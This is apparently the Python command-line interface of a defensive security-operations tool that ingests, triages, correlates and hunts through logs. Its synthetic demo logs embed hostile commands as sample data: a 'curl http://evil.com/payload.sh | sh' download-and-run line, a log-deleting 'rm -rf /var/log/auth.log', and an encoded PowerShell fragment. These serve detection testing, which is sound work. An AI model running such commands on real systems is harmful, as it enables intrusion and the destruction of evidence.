"""
SentinelForge CLI — command-line interface for all platform operations.

Usage:
    sentinelforge ingest <file>          Ingest logs from file
    sentinelforge triage                 Run triage on pending alerts
    sentinelforge investigate <alert_id> Investigate a specific alert
    sentinelforge correlate              Correlate alerts into incidents
    sentinelforge hunt [hypothesis]      Run threat hunts
    sentinelforge dashboard              Launch web dashboard
    sentinelforge demo                   Run full demo with sample data
    sentinelforge status                 Show system status
"""

from __future__ import annotations

import json
import os
import sys
import time
from pathlib import Path

try:
    import click
    HAS_CLICK = True
except ImportError:
    HAS_CLICK = False

from sentinelforge import __version__
from sentinelforge.schemas import AlertStatus, Severity
from sentinelforge.store import alert_store, incident_store


def _get_sample_data_dir() -> str:
    """Locate sample_data directory."""
    # Check relative to package
    pkg_dir = Path(__file__).parent.parent.parent
    candidates = [
        pkg_dir / "sample_data",
        Path.cwd() / "sample_data",
        Path(__file__).parent.parent.parent.parent / "sample_data",
    ]
    for path in candidates:
        if path.is_dir():
            return str(path)
    return str(candidates[0])


def _print_banner():
    """Print the SentinelForge banner."""
    banner = f"""
    ╔══════════════════════════════════════════════════╗
    ║           SentinelForge v{__version__}                  ║
    ║       Autonomous SOC Analyst Platform            ║
    ║                                                  ║
    ║   Created by Corey A. Wade (CISSP, CCIE #14124)  ║
    ╚══════════════════════════════════════════════════╝
    """
    print(banner)


def _print_alert_summary(alerts, title="Alert Summary"):
    """Print a formatted alert summary."""
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")

    severity_counts = {s.name: 0 for s in Severity}
    status_counts = {}
    for a in alerts:
        severity_counts[a.severity.name] = severity_counts.get(a.severity.name, 0) + 1
        status_counts[a.status.value] = status_counts.get(a.status.value, 0) + 1

    print(f"\n  Total alerts: {len(alerts)}")
    print(f"  Severity distribution:")
    colors = {"CRITICAL": "\033[91m", "HIGH": "\033[93m", "MEDIUM": "\033[33m", "LOW": "\033[92m", "INFO": "\033[94m"}
    reset = "\033[0m"
    for sev, count in severity_counts.items():
        if count > 0:
            bar = "#" * min(count, 40)
            print(f"    {colors.get(sev, '')}{sev:>10}{reset}: {count:>3} {bar}")

    print(f"\n  Status distribution:")
    for status, count in status_counts.items():
        print(f"    {status:>15}: {count}")

    print(f"\n  Top alerts:")
    for alert in sorted(alerts, key=lambda a: a.severity.value, reverse=True)[:10]:
        sev_color = colors.get(alert.severity.name, "")
        print(f"    {sev_color}[{alert.severity.name:>8}]{reset} {alert.category or 'N/A':>20} | {alert.src_ip or 'N/A':>15} | {(alert.activity or alert.class_name or 'N/A')[:50]}")
        if alert.mitre_technique_id:
            print(f"             ATT&CK: {alert.mitre_technique_id} — {alert.mitre_technique}")

    print(f"{'='*70}\n")


def run_demo():
    """Run a full demo pipeline with sample data."""
    from sentinelforge.ingest import ingest_log
    from sentinelforge.triage import triage_alert
    from sentinelforge.investigate import investigate_alert
    from sentinelforge.correlate import correlate_alerts
    from sentinelforge.hunt import hunt
    from sentinelforge.models import RuleEngine

    _print_banner()

    # Load sample data
    sample_dir = _get_sample_data_dir()
    sample_logs = []

    for fname in sorted(os.listdir(sample_dir)):
        fpath = os.path.join(sample_dir, fname)
        if os.path.isfile(fpath):
            with open(fpath) as f:
                content = f.read().strip()
                if fname.endswith(".json"):
                    try:
                        data = json.loads(content)
                        if isinstance(data, list):
                            sample_logs.extend(json.dumps(item) for item in data)
                        else:
                            sample_logs.append(content)
                    except json.JSONDecodeError:
                        for line in content.splitlines():
                            if line.strip():
                                sample_logs.append(line.strip())
                else:
                    for line in content.splitlines():
                        if line.strip() and not line.strip().startswith("#"):
                            sample_logs.append(line.strip())

    if not sample_logs:
        print("  No sample data found. Creating synthetic alerts...")
        sample_logs = _generate_synthetic_logs()

    # Phase 1: Ingestion
    print(f"\n  [Phase 1] INGESTION — Processing {len(sample_logs)} logs...")
    print(f"  {'─'*50}")
    alerts = []
    for i, raw in enumerate(sample_logs):
        alert = ingest_log(raw)
        alerts.append(alert)
        if (i + 1) % 5 == 0 or i == len(sample_logs) - 1:
            sys.stdout.write(f"\r  Ingested: {i+1}/{len(sample_logs)}")
            sys.stdout.flush()
    print()

    # Phase 2: Triage
    print(f"\n  [Phase 2] TRIAGE — Classifying {len(alerts)} alerts...")
    print(f"  {'─'*50}")
    auto_closed = 0
    for alert in alerts:
        alert = triage_alert(alert)
        alert_store.update(alert)
        if alert.status == AlertStatus.AUTO_CLOSED:
            auto_closed += 1
    print(f"  Triaged: {len(alerts)} | Auto-closed (benign): {auto_closed}")

    # Phase 3: Detection Rules
    print(f"\n  [Phase 3] DETECTION — Running rule engine...")
    print(f"  {'─'*50}")
    engine = RuleEngine()
    detections = engine.evaluate_batch(alerts)
    print(f"  Detection rules fired: {len(detections)}")
    for det in detections[:5]:
        print(f"    [{det.rule_id}] {det.rule_name}: {det.description[:60]}")

    _print_alert_summary(alerts, "Triage Results")

    # Phase 4: Investigation
    print(f"\n  [Phase 4] INVESTIGATION — Analyzing high-severity alerts...")
    print(f"  {'─'*50}")
    high_alerts = [a for a in alerts if a.severity >= Severity.HIGH and a.status != AlertStatus.AUTO_CLOSED]
    for alert in high_alerts[:3]:
        report = investigate_alert(alert)
        print(f"    Alert {alert.alert_id[:8]}... | Risk: {report.risk_score}/10 | IOCs: {len(report.iocs)} | Related: {len(report.related_alerts)}")
        if report.lateral_movement_detected:
            print(f"      ** LATERAL MOVEMENT DETECTED **")
        for rec in report.recommendations[:2]:
            print(f"      -> {rec}")

    # Phase 5: Correlation
    print(f"\n  [Phase 5] CORRELATION — Grouping into incidents...")
    print(f"  {'─'*50}")
    incidents = correlate_alerts()
    print(f"  Incidents created: {len(incidents)}")
    for inc in incidents[:5]:
        print(f"    {inc.incident_id}: [{inc.severity.name}] {inc.title[:70]}")
        print(f"      Alerts: {len(inc.alert_ids)} | Kill chain: {inc.kill_chain_phase} | Tactics: {', '.join(inc.mitre_tactics[:3])}")

    # Phase 6: Threat Hunting
    print(f"\n  [Phase 6] THREAT HUNTING — Executing hypotheses...")
    print(f"  {'─'*50}")
    hunt_results = hunt()
    for hr in hunt_results:
        print(f"    Hunt '{hr.hypothesis}': {hr.match_count} matches | Anomaly score: {hr.anomaly_score}/10")
        for anomaly in hr.anomalies[:2]:
            print(f"      Anomaly: {anomaly['description']}")

    # Final Summary
    print(f"\n{'='*70}")
    print(f"  DEMO COMPLETE — SentinelForge Pipeline Summary")
    print(f"{'='*70}")
    print(f"  Logs ingested:     {len(sample_logs)}")
    print(f"  Alerts created:    {len(alerts)}")
    print(f"  Auto-closed:       {auto_closed}")
    print(f"  Detections:        {len(detections)}")
    print(f"  Incidents:         {len(incidents)}")
    print(f"  Hunts with hits:   {len(hunt_results)}")
    print(f"\n  Launch the dashboard:")
    print(f"    sentinelforge dashboard")
    print(f"    Then open http://localhost:5000")
    print(f"{'='*70}\n")


def _generate_synthetic_logs() -> list[str]:
    """Generate synthetic sample logs for demo."""
    return [
        '<134>1 2026-02-23T10:15:30Z firewall01 sshd 12345 - - Failed password for admin from 198.51.100.23 port 22 ssh2',
        '<134>1 2026-02-23T10:15:31Z firewall01 sshd 12345 - - Failed password for admin from 198.51.100.23 port 22 ssh2',
        '<134>1 2026-02-23T10:15:32Z firewall01 sshd 12345 - - Failed password for admin from 198.51.100.23 port 22 ssh2',
        '<134>1 2026-02-23T10:15:33Z firewall01 sshd 12345 - - Failed password for root from 198.51.100.23 port 22 ssh2',
        '<134>1 2026-02-23T10:15:34Z firewall01 sshd 12345 - - Failed password for root from 198.51.100.23 port 22 ssh2',
        'CEF:0|SecurityCo|Firewall|1.0|100|Connection to known C2|9|src=10.0.1.10 dst=203.0.113.66 dpt=443 spt=54321 proto=TCP act=blocked cat=C2',
        'CEF:0|SecurityCo|IDS|2.0|200|Suspicious PowerShell|8|src=10.0.1.25 spt=0 msg=powershell -enc SQBFAFgA act=detected suser=admin1',
        'LEEF:2.0|IBM|QRadar|3.0|PortScan|src=192.0.2.99\tsrcPort=0\tdst=10.0.1.50\tdstPort=445\tproto=TCP\tsev=5\taction=port scan detected',
        '{"event_type":"authentication","source_ip":"198.51.100.23","dest_ip":"10.0.1.50","username":"administrator","message":"Failed login attempt from external IP","severity":"HIGH"}',
        '{"event_type":"malware_detected","source_ip":"10.0.1.10","host":"WORKSTATION-01","process":"mimikatz.exe","message":"Credential dumping tool detected on workstation","severity":"CRITICAL"}',
        '<38>Feb 23 10:20:00 webserver01 kernel: [UFW BLOCK] IN=eth0 SRC=192.0.2.99 DST=10.0.2.100 PROTO=TCP DPT=3306',
        '<134>1 2026-02-23T10:21:00Z dc01 sshd 5678 - - Accepted publickey for deploy from 10.0.1.25 port 22 ssh2',
        'CEF:0|SecurityCo|DLP|1.0|300|Large Data Transfer|7|src=10.0.1.10 dst=198.51.100.23 dpt=443 msg=upload 500MB to external host act=exfiltration attempt cat=DataLoss',
        '{"event_type":"dns_query","source_ip":"10.0.1.10","query":"asdfjkl3490sdkfjh2340sdfkj.xyz","response":"NXDOMAIN","message":"Suspicious DGA domain query","severity":"MEDIUM"}',
        'Jan 23 10:25:00 server02 CRON[9876]: (root) CMD (/usr/local/bin/backup.sh)',
        '<134>1 2026-02-23T10:30:00Z host01 sudo 1111 - - admin1 : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl http://evil.com/payload.sh | sh',
        'CEF:0|SecurityCo|IDS|2.0|201|Ransomware Indicator|10|src=10.0.1.10 msg=Files being encrypted with .locked extension act=ransomware detected cat=Malware',
        '{"event_type":"lateral_movement","source_ip":"10.0.1.10","dest_ip":"10.0.1.50","username":"admin1","message":"psexec connection from workstation to domain controller","severity":"CRITICAL"}',
        '<134>1 2026-02-23T10:35:00Z host01 audit 2222 - - User admin1 cleared auth.log: rm -rf /var/log/auth.log',
        '{"event_type":"phishing","source_ip":"203.0.113.66","dest_ip":"10.0.1.10","username":"jdoe","message":"Suspicious phishing email with malicious attachment opened","severity":"HIGH"}',
    ]


if HAS_CLICK:
    @click.group()
    @click.version_option(version=__version__)
    def cli():
        """SentinelForge — Autonomous SOC Analyst Platform"""
        pass

    @cli.command()
    @click.argument("file", type=click.Path(exists=True))
    @click.option("--format", "log_format", type=click.Choice(["auto", "syslog", "cef", "leef", "json", "windows_xml"]), default="auto")
    def ingest(file: str, log_format: str):
        """Ingest logs from a file."""
        from sentinelforge.ingest import ingest_log

        _print_banner()
        count = 0
        with open(file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    alert = ingest_log(line)
                    count += 1
                    click.echo(f"  Ingested [{alert.severity.name:>8}]: {alert.category or 'N/A'} | {alert.src_ip or 'N/A'}")

        click.echo(f"\n  Total ingested: {count}")

    @cli.command()
    def triage():
        """Run triage on all pending alerts."""
        from sentinelforge.triage import triage_alert

        _print_banner()
        alerts = alert_store.list_all(status=AlertStatus.NEW, limit=1000)
        if not alerts:
            click.echo("  No pending alerts to triage.")
            return

        for alert in alerts:
            triage_alert(alert)
            alert_store.update(alert)
            click.echo(f"  [{alert.severity.name:>8}] {alert.verdict.value:>10} | {alert.mitre_technique_id or 'N/A':>10} | {alert.triage_reason[:60]}")

        _print_alert_summary(alerts, "Triage Results")

    @cli.command()
    @click.argument("alert_id")
    def investigate(alert_id: str):
        """Investigate a specific alert."""
        from sentinelforge.investigate import investigate_alert

        _print_banner()
        alert = alert_store.get(alert_id)
        if not alert:
            click.echo(f"  Alert {alert_id} not found.")
            return

        report = investigate_alert(alert)
        click.echo(f"\n  Investigation Report for {alert_id}")
        click.echo(f"  {'─'*50}")
        click.echo(f"  Risk Score: {report.risk_score}/10")
        click.echo(f"  IOCs found: {len(report.iocs)}")
        for ioc in report.iocs[:10]:
            click.echo(f"    [{ioc.ioc_type}] {ioc.value} ({ioc.context})")
        click.echo(f"  Related alerts: {len(report.related_alerts)}")
        click.echo(f"  Lateral movement: {'YES' if report.lateral_movement_detected else 'No'}")
        if report.lateral_movement_evidence:
            for ev in report.lateral_movement_evidence:
                click.echo(f"    -> {ev}")
        click.echo(f"\n  Recommendations:")
        for rec in report.recommendations:
            click.echo(f"    -> {rec}")

    @cli.command()
    def correlate():
        """Correlate alerts into incidents."""
        from sentinelforge.correlate import correlate_alerts

        _print_banner()
        incidents = correlate_alerts()
        click.echo(f"\n  Incidents created: {len(incidents)}")
        for inc in incidents:
            click.echo(f"  {inc.incident_id}: [{inc.severity.name}] {inc.title[:70]}")
            click.echo(f"    Alerts: {len(inc.alert_ids)} | Phase: {inc.kill_chain_phase}")

    @cli.command("hunt")
    @click.argument("hypothesis", required=False)
    def hunt_cmd(hypothesis: str | None):
        """Run threat hunting hypotheses."""
        from sentinelforge.hunt import hunt

        _print_banner()
        results = hunt(hypothesis)
        if not results:
            click.echo("  No hunt results (no matching alerts found).")
            return

        for hr in results:
            click.echo(f"\n  Hunt: {hr.hypothesis}")
            click.echo(f"  Matches: {hr.match_count} | Anomaly Score: {hr.anomaly_score}/10")
            click.echo(f"  {hr.summary}")
            for anomaly in hr.anomalies[:5]:
                click.echo(f"    Anomaly: {anomaly['description']}")

    @cli.command()
    @click.option("--host", default="0.0.0.0")
    @click.option("--port", default=5000, type=int)
    @click.option("--debug", is_flag=True)
    def dashboard(host: str, port: int, debug: bool):
        """Launch the web dashboard."""
        from sentinelforge.dashboard import create_dashboard_app

        _print_banner()
        click.echo(f"  Starting dashboard on http://{host}:{port}")
        click.echo(f"  Press Ctrl+C to stop.\n")
        app = create_dashboard_app()
        app.run(host=host, port=port, debug=debug)

    @cli.command()
    def demo():
        """Run full demo pipeline with sample data."""
        run_demo()

    @cli.command()
    def status():
        """Show system status."""
        _print_banner()
        click.echo(f"  Alerts in store:    {alert_store.count()}")
        click.echo(f"  Incidents in store: {incident_store.count()}")
        alerts = alert_store.list_all(limit=10000)
        if alerts:
            _print_alert_summary(alerts)

else:
    # Fallback CLI without Click
    def cli():
        """Basic CLI without Click."""
        args = sys.argv[1:]
        if not args or args[0] in ("-h", "--help"):
            print(__doc__)
            return
        if args[0] == "--version":
            print(f"SentinelForge v{__version__}")
            return
        if args[0] == "demo":
            run_demo()
        elif args[0] == "status":
            _print_banner()
            print(f"  Alerts: {alert_store.count()} | Incidents: {incident_store.count()}")
        else:
            print(f"Unknown command: {args[0]}")
            print("Install click for full CLI: pip install click")
            print(__doc__)


def main():
    """Entry point."""
    cli()
